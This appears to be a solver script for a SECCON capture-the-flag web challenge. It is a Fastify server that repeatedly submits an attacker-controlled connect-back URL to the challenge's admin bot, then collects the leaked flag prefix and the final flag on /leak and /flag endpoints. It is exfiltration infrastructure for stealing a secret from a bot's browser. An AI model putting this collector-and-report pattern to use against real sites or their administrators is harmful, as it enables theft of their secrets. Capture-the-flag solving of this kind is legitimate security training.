import fastify from "fastify";
import fs from "node:fs/promises";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

let known = "SECCON{";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(await fs.readFile("index.html"));
});

app.post("/debug", async (req, reply) => {
  console.log("[DEBUG]", req.body);
  return "";
});

app.post("/leak", async (req, reply) => {
  known = req.body;
  console.log({ known });
  return "";
});

app.post("/flag", async (req, reply) => {
  // You got a flag!
  const flag = req.body;
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);

  for (let i = 0; i < 5; i++) {
    console.log(`Report: ${i + 1}`);
    await reportUrl(`${CONNECTBACK_URL}?known=${encodeURIComponent(known)}`);
  }
  assert.fail("Failed");
});
